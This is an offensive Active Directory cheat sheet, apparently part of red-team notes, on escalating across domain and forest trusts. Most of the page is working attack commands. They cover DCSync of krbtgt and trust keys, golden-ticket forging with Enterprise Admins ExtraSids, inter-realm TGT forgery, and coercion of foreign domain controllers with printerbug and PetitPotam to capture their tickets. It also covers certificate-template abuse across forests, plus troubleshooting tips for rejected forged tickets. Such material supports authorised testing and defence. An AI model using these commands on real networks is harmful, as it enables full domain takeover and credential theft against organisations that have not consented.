# AD - Domain & Forest Trusts

## Table of Contents
- [Trust Fundamentals](#trust-fundamentals)
- [Enumerating Trusts](#enumerating-trusts)
- [Intra-Forest: Child to Parent (worked end to end)](#intra-forest-child-to-parent-worked-end-to-end)
- [Intra-Forest: Trust Key Attack](#intra-forest-trust-key-attack)
- [Inter-Forest: SID Filtering — what it blocks](#inter-forest-sid-filtering--what-it-blocks)
- [Inter-Forest: TDO / Trust Key Extraction & Forging](#inter-forest-tdo--trust-key-extraction--forging)
- [Unconstrained Delegation Across Trusts](#unconstrained-delegation-across-trusts)
- [Foreign Group Membership & FSPs](#foreign-group-membership--fsps)
- [Cross-Forest ADCS Abuse](#cross-forest-adcs-abuse)
- [PAM / Bastion Trusts](#pam--bastion-trusts)

For ticket-forging syntax details see [domain-dominance.md](domain-dominance.md). For delegation mechanics see [kerberos.md](kerberos.md). For pivoting between networks see [lateral-movement.md](lateral-movement.md).

---

## Trust Fundamentals
- **Trust direction vs access direction are opposite.** If A trusts B (one-way, A->B outgoing on A / incoming on B), then **B's users can access A's resources**. Access flows against the arrow.
- **Two-way (bidirectional):** both directions; users of each can access the other.
- **Transitive:** trust chains (A trusts B, B trusts C => A trusts C). **Non-transitive:** does not chain.
- **Parent-child:** automatically created when a child domain is added to a tree (`child.domain.local` under `domain.local`). Two-way, transitive.
- **Tree-root:** links the root of a new tree to the forest root. Two-way, transitive.
- **External:** between domains in different forests (or NT4). Non-transitive by default; SID filtering applies.
- **Forest trust:** between two forest roots; transitive within each forest. SID filtering on by default (quarantine), but SID History honored only if configured.
- **Realm:** to a non-Windows Kerberos realm (MIT/Heimdal). Can be transitive/non-transitive, one/two-way.
- **Key security boundary:** the **forest**, not the domain. DA of a child domain can become **Enterprise Admin** (forest root DA) because intra-forest trusts do **not** filter SID History by default. This is the classic child->parent escalation.

## Enumerating Trusts
```cmd
:: native
nltest /domain_trusts
nltest /domain_trusts /all_trusts /v
nltest /trusted_domains
```
```powershell
# PowerView / SharpView
Get-DomainTrust
Get-DomainTrust -Domain child.domain.local
Get-ForestTrust
Get-DomainTrustMapping                 # recursively map all reachable trusts
Get-DomainForeignGroupMember -Domain domain.local
sharpview.exe Get-DomainTrust
```
```bash
# Linux
nxc ldap dc.domain.local -u user -p 'pass' -M enum_trusts
ldapsearch -x -H ldap://dc.domain.local -D 'user@domain.local' -w 'pass' \
  -b 'CN=System,DC=domain,DC=local' '(objectClass=trustedDomain)' \
  trustPartner trustDirection trustType trustAttributes
# impacket
python3 -c "from impacket... " ; nltest via samr not needed
```
```bash
# BloodHound - collect across trusts, then query
bloodhound-python -u user -p 'pass' -d domain.local -c All -ns 10.10.10.10 --zip
# In BloodHound: "Map Domain Trusts" + edges CanRDP/GenericAll spanning domains
```
Read `trustDirection` (1=inbound,2=outbound,3=bidirectional), `trustAttributes` (0x8=forest-transitive, 0x40=treat-as-external / quarantined = SID filtering, 0x400=PIM/PAM).

`trustAttributes` reference:

| Value | Name | Meaning |
|---|---|---|
| 0x1 | NON_TRANSITIVE | trust does not chain |
| 0x2 | UPLEVEL_ONLY | only Win2000+ clients |
| 0x4 | QUARANTINED_DOMAIN | **SID filtering enabled** (external default) |
| 0x8 | FOREST_TRANSITIVE | forest trust |
| 0x10 | CROSS_ORGANIZATION | selective authentication |
| 0x20 | WITHIN_FOREST | intra-forest — **no SID filtering**, child->parent works |
| 0x40 | TREAT_AS_EXTERNAL | SID filtering as if external |
| 0x200 | CROSS_ORGANIZATION_NO_TGT_DELEGATION | cross-forest TGT delegation disabled |
| 0x400 | PIM_TRUST | PAM / bastion trust |

`trustType`: 1=downlevel(NT4), 2=uplevel(AD), 3=MIT(realm), 4=DCE.

The trust account in each domain is named `<partnerNetBIOS>$` (e.g. the parent stores `CHILD$`, the child stores `PARENT$`). DCSync that account name to pull the trust key.

## Intra-Forest: Child to Parent (worked end to end)
Goal: from **DA of child.domain.local** to **Enterprise Admin** of the forest root `domain.local`. Method: forge a golden ticket in the child with an **ExtraSid** pointing at the parent's Enterprise Admins group (`<root_SID>-519`). Intra-forest trusts do not apply SID filtering, so the parent honors the injected SID.

Material needed (all obtainable as child DA):
1. **krbtgt hash of the child** (DCSync in child).
2. **Child domain SID**.
3. **Parent (root) domain SID** — target `-519` (Enterprise Admins).

```bash
# 1. DCSync child krbtgt
secretsdump.py child.domain.local/childadmin:'Password1'@child-dc.child.domain.local -just-dc-user krbtgt
# krbtgt:502:aad3b...:<krbtgt_NT>:::   and AES keys below

# 2. Get SIDs
nxc smb child-dc.child.domain.local -u childadmin -p 'Password1'   # shows child SID
lookupsid.py child.domain.local/childadmin:'Password1'@dc.domain.local | head    # enumerate parent SID
# or PowerView:  Get-DomainSID -Domain domain.local
```
```bash
# 3. Forge golden ticket with ExtraSid = <ROOT_SID>-519 (Enterprise Admins)
ticketer.py -nthash <child_krbtgt_NT> -domain child.domain.local \
  -domain-sid <CHILD_SID> -extra-sid <ROOT_SID>-519 Administrator
export KRB5CCNAME=Administrator.ccache

# 4. Use it against the ROOT DC (DCSync the parent proves EA)
secretsdump.py -k -no-pass domain.local/Administrator@root-dc.domain.local -just-dc-user Administrator
psexec.py -k -no-pass domain.local/Administrator@root-dc.domain.local
```
```
:: Windows equivalent - mimikatz
kerberos::golden /user:Administrator /domain:child.domain.local /sid:<CHILD_SID> \
  /sids:<ROOT_SID>-519 /krbtgt:<child_krbtgt_NT> /ptt
:: Rubeus
Rubeus.exe golden /rc4:<child_krbtgt_NT> /domain:child.domain.local /sid:<CHILD_SID> \
  /sids:<ROOT_SID>-519 /user:Administrator /ptt
```
Use `<ROOT_SID>-519` (Enterprise Admins) for full forest; `-516` = Domain Controllers, `-512` (root) = root Domain Admins. Prefer AES: pass `-aesKey <child_krbtgt_AES256>` to ticketer / `/aes256:` in mimikatz.

Well-known RID cheat-sheet for ExtraSids: `-500` Administrator, `-502` krbtgt, `-512` Domain Admins, `-513` Domain Users, `-516` Domain Controllers, `-518` Schema Admins, `-519` Enterprise Admins, `-520` Group Policy Creator Owners, `-521` Read-only DCs.

Troubleshooting: if the forged ticket is rejected at the parent, confirm (1) clock skew < 5 min (`ntpdate <root-dc>`), (2) you targeted the parent by **FQDN** not IP, (3) you used the **child** domain/SID for the ticket body and the **root** SID only in ExtraSids, (4) `krbtgt` hash is the child's, not the parent's.

## Intra-Forest: Trust Key Attack
Alternative to owning child krbtgt: use the **inter-realm trust key** shared between child and parent to forge an inter-realm TGT (referral) directly. Extract the trust key from either DC.

```
:: dump trust keys (mimikatz on a DC)
lsadump::trust /patch
lsadump::dcsync /domain:child.domain.local /user:domain.local$    # the TDO account "PARENT$"
```
```
:: forge inter-realm TGT (child -> parent) with the trust key, add EA SID
kerberos::golden /user:Administrator /domain:child.domain.local /sid:<CHILD_SID> \
  /sids:<ROOT_SID>-519 /rc4:<trust_key> /service:krbtgt /target:domain.local /ptt
:: then ask the parent for a TGS to a service and use it
Rubeus.exe asktgs /ticket:referral.kirbi /service:cifs/root-dc.domain.local /ptt
```
```bash
# impacket - forge with trust key then request service ticket in parent
ticketer.py -nthash <trust_key> -domain child.domain.local -domain-sid <CHILD_SID> \
  -extra-sid <ROOT_SID>-519 -spn krbtgt/domain.local Administrator
getST.py -k -no-pass -spn cifs/root-dc.domain.local domain.local/Administrator
```

## Inter-Forest: SID Filtering — what it blocks
Across a **forest/external** trust, SID filtering (quarantine) strips SIDs from the **trusted** domain that are not native to it — specifically it drops injected **sIDHistory** and foreign SIDs in the PAC. So the child->parent ExtraSid trick **does not cross a forest boundary** by default.

- **Blocked:** injected high-priv SIDs / sIDHistory from another forest (the golden-ticket ExtraSid escalation).
- **NOT blocked:** SIDs >= 1000 that are **native** to the trusted forest are still honored. So if a group in Forest A has a member from Forest B (foreign membership), that legitimate access works.
- **NOT blocked:** relative-identifier abuse is stopped, but any **legitimately granted cross-forest access** (ACLs, group membership, delegation) remains exploitable.
- **`TREAT_AS_EXTERNAL` / SID history enabled:** admins sometimes enable SID history across a forest trust (`netdom trust ... /EnableSIDHistory:yes`) — then the injection **does** cross. Check `trustAttributes`.
- Enumerate whether filtering is on: `Get-DomainTrust` `TrustAttributes` — `FOREST_TRANSITIVE` with quarantine implies filtering; `WITHIN_FOREST` never filters.

## Inter-Forest: TDO / Trust Key Extraction & Forging
Each trust has a **Trusted Domain Object (TDO)** storing the shared trust key (an `[in]` and `[out]` key). With DA in one forest, extract the key and forge an **inter-realm TGT** to access the trusting forest — limited by SID filtering to legitimately reachable resources.

```
:: extract trust keys
lsadump::trust /patch
lsadump::dcsync /domain:forestA.local /user:forestB.local$      # trust account for the partner
```
```bash
# impacket
secretsdump.py forestA.local/admin:'pass'@dc.forestA.local -just-dc-user 'forestB.local$'
# forge inter-realm referral TGT (no ExtraSid across forest - SID filtered)
ticketer.py -nthash <trust_key> -domain forestA.local -domain-sid <A_SID> \
  -spn krbtgt/forestB.local Administrator
getST.py -k -no-pass -spn cifs/dc.forestB.local forestB.local/Administrator
```
You can reach resources/users you are legitimately authorized to across the trust; you cannot inject EA/DA of the foreign forest.

## Unconstrained Delegation Across Trusts
A host with **unconstrained delegation** in Forest A caches TGTs of anyone who authenticates to it. Combined with a **two-way forest trust**, coercing a **foreign DC** (Forest B) to authenticate (via printer bug / PetitPotam) lands **Forest B's DC TGT** on your Forest A host -> DCSync Forest B. Requires the trust to allow TGT delegation (`TrustAttributes` without `NON_TRANSITIVE`/no `enableTGTDelegation` restriction — cross-forest TGT delegation is disabled by default on modern builds).

```
:: on the unconstrained-delegation host - monitor for incoming TGTs
Rubeus.exe monitor /interval:5 /nowrap
```
```bash
# coerce the foreign DC to authenticate to your unconstrained host
python3 printerbug.py forestB.local/user:'pass'@fbdc.forestB.local <unconstrained_host_ip>
python3 PetitPotam.py -u user -p 'pass' -d forestB.local <unconstrained_host_ip> fbdc.forestB.local
# extract captured TGT (from Rubeus), then:
Rubeus.exe ptt /ticket:<fbdc_TGT>
# use the DC's TGT to DCSync Forest B
secretsdump.py -k -no-pass forestB.local/'FBDC$'@fbdc.forestB.local -just-dc
```
Note: `msDS-EnableTGTDelegation` / trust `TGTDelegation` must be enabled for cross-forest; intra-forest it works by default.

## Foreign Group Membership & FSPs
Cross-domain access is often granted by adding a principal from Domain B into a group in Domain A. In A, B's member appears as a **Foreign Security Principal (FSP)** under `CN=ForeignSecurityPrincipals`. These grants survive SID filtering (they are native/legitimate) and are prime lateral paths.

```powershell
# find users from other domains in local/domain groups
Get-DomainForeignGroupMember -Domain domain.local
Get-DomainForeignUser
# resolve an FSP SID
ConvertFrom-SID S-1-5-21-...
```
```bash
nxc ldap dc.domain.local -u user -p 'pass' -M group-mem     # inspect group members
# BloodHound: look for cross-domain edges (foreign principals in privileged groups)
```

## Cross-Forest ADCS Abuse
If a CA in Forest A publishes templates that Forest B principals can enroll in (cross-forest enrollment), ESC misconfigurations become cross-forest escalation. Enumerate the CA from the other forest and abuse ESC1/ESC8 as normal, authenticating with foreign creds.

```bash
# enumerate CAs/templates reachable across the trust
certipy find -u user@forestB.local -p 'pass' -dc-ip <A_dc_ip> -target ca.forestA.local -vulnerable
# ESC1: request a cert for a privileged UPN if template allows SAN + client auth
certipy req -u user@forestB.local -p 'pass' -ca 'FORESTA-CA' -target ca.forestA.local \
  -template VulnTemplate -upn administrator@forestA.local
certipy auth -pfx administrator.pfx -dc-ip <A_dc_ip>
```
Watch for CAs trusting the foreign forest's NTAuth / cross-forest enrollment permissions on templates.

## PAM / Bastion Trusts
A **PAM (Privileged Access Management) trust** is a one-way forest trust from a production forest to a **bastion/red (ESAE) forest**, with `TrustAttributes` `PIM_TRUST` (0x400) and SID filtering configured to **allow** shadow-principal SIDs from the bastion. Bastion admins are mapped via **Shadow Principals** (`CN=Shadow Principals,CN=Configuration`) whose `member` links to production accounts and whose SID equals a production privileged SID.

```powershell
# enumerate shadow principals / PAM trust from the bastion forest
Get-ADObject -SearchBase "CN=Shadow Principals,CN=Configuration,DC=bastion,DC=local" -Filter * -Properties member,msDS-ShadowPrincipalSid
Get-DomainTrust | ? { $_.TrustAttributes -match 'PIM' }
```
If you compromise the bastion forest, the shadow principals give time-boxed but real privileged SIDs in production — request a TGT as the mapped bastion account and the injected SID is honored across the PAM trust (this is the intended-but-abusable path). Enumerate `msDS-ShadowPrincipalSid` values to see which production groups (e.g. `-512`, `-519`) you can wield.
